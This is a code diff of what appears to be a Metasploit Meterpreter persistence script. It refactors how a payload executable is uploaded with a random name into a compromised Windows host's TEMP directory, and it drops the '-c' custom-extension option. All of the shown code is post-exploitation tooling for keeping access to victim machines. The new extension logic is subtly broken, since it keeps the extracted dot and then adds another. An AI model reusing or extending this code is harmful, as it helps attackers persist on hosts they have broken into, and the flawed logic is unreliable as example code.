@@ -19,7 +19,7 @@
 name = "update-svc-msf"
 delay = 5
 unin = false
-cusext = ".exe"
+ext = ".exe"
 cusexe = ""
 
 @exec_opts = Rex::Parser::Arguments.new(
@@ -46,10 +46,10 @@ meter_type = client.platform
   # uploads the payload to the host with the correct extension
   ##
 
-  def write_to_target(payloadsource, ext)
+  def write_to_target(payloadsource)
     tempdir = @client.sys.config.getenv('TEMP')
+    ext = payloadsource[payloadsource.rindex(".") .. -1]
     tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + "." + ext
-    #print_good(tempdir +" "+ tempfile)
     begin
       session.fs.file.upload_file(tempfile, payloadsource)
       print_good("Persistent Script written to #{tempfile}")
@@ -120,8 +120,6 @@ meter_type = client.platform
     cusexe = val.to_s
   when "-n"
     name = val.to_s
-  when "-c"
-    cusext = val.to_s
   when "-u"
     unin = true
   when "-d"
@@ -141,7 +139,7 @@ meter_type = client.platform
 
     else
       # uploads the payload to the host
-      script_on_target = write_to_target(cusexe, cusext)
+      script_on_target = write_to_target(cusexe)
 
       # exit the module because we failed to write the file on the target host.
       return unless script_on_target
